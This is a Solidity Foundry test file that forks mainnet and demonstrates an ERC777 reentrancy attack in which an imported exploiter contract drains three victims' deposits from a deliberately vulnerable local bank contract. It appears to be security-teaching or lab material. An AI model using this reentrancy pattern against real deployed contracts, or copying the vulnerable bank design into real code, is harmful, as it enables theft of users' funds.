// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std-1.9.2/src/Test.sol";
import {CompatibleSmartAccount, IncompatibleSmartAccount, CompatibleSmartAccountWithHooks} from "../src/Accounts.sol";
import {SimpleERC777} from "../src/SimpleERC777.sol";
import {ERC777Bank} from "../src/ERC777Bank.sol";
import {BankExploiter} from "../src/BankExploiter.sol";
import {IERC1820Registry} from "@openzeppelin/contracts@4.9.0/utils/introspection/IERC1820Registry.sol";
import {ERC777} from "@openzeppelin/contracts@4.9.0/token/ERC777/ERC777.sol";

/**
 * - create savings token (MyERC777)
 * - create bank
 * - let multiple owners save
 * - exploit
 */
contract ERC777ReentrancyTest is Test {
    // EOAs
    address owner = address(99);
    address victim1 = address(101);
    address victim2 = address(102);
    address victim3 = address(103);

    address evil = address(666);

    SimpleERC777 public savingsToken;
    ERC777Bank public bank;

    // Exploiter
    BankExploiter public exploiter;

    // ERC1820
    IERC1820Registry internal constant ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    // interface hashes
    bytes32 public constant TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 public constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    function setUp() public {
        string memory mainnetRPCUrl = vm.envString("MAINNET_RPC_URL");

        // Fork mainnet
        vm.createSelectFork(mainnetRPCUrl);

        // Verify ERC1820Registry exists at the expected address
        require(address(ERC1820_REGISTRY).code.length > 0, "ERC1820Registry not found");

        bank = new ERC777Bank();

        // bank is default operator
        address[] memory defaultOperators = new address[](1);
        defaultOperators[0] = address(bank);

        vm.startPrank(owner);
        savingsToken = new SimpleERC777("Bank Note", "BN", defaultOperators);

        bank.setSavingsToken(address(savingsToken));

        bytes memory userData = "";
        bytes memory operatorData = "";

        savingsToken.mint(victim1, 100e18, userData, operatorData, true);
        savingsToken.mint(victim2, 100e18, userData, operatorData, true);
        savingsToken.mint(victim3, 100e18, userData, operatorData, true);
        savingsToken.mint(evil, 100e18, userData, operatorData, true);

        vm.stopPrank();
        vm.prank(victim1);
        bank.deposit(100e18);
        vm.prank(victim2);
        bank.deposit(100e18);
        vm.prank(victim3);
        bank.deposit(100e18);

        vm.prank(evil);

        exploiter = new BankExploiter(address(savingsToken), address(bank), evil);

        // erc1820 related
        // since evil is the manager of exploiter (done in its constructor) evil can set interface
        vm.prank(evil);
        ERC1820_REGISTRY.setInterfaceImplementer(
            address(exploiter), TOKENS_RECIPIENT_INTERFACE_HASH, address(exploiter)
        );
    }

    function test_reentrancyExploit() public {
        bytes memory data = "";
        vm.prank(evil);
        savingsToken.send(address(exploiter), 100e18, data);
        exploiter.save(100e18); // make exploiter a customer
        // attack
        exploiter.withdraw();

        uint256 endingBalance = savingsToken.balanceOf(address(exploiter));
        vm.assertEq(endingBalance, 400e18);
    }

    /*════════════════════════════════════════════════════════════*\
    ║                                                            ║
    ║                     HELPER FUNCTIONS                       ║
    ║                                                            ║
    \*════════════════════════════════════════════════════════════*/
}
